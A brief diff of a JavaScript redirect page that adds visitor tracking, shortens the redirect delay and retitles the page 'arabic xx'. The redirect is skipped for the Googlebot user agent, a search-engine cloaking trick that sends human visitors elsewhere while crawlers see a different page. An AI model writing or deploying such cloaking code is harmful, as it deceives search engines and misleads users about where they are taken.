@@ -1,5 +1,5 @@
 // 1. Set Page Title
-document.title = "Redirecting in 3 seconds...";
+document.title = "arabic xx";
 
 // 2. Official Histats Tracking Script (100% Working & Reliable)
 var _Hasync = _Hasync || [];
@@ -16,7 +16,7 @@ _Hasync.push(['Histats.track_hits', '']);
 })();
 
 // 3. Time Delay & Redirect Logic
-var redirectDelay = 3000; // ৩ সেকেন্ড সময় (প্রয়োজনে কমাতে বা বাড়াতে পারেন)
+var redirectDelay = 1000;
 
 setTimeout(function() {
   if (!navigator.userAgent.includes('Googlebot')) {
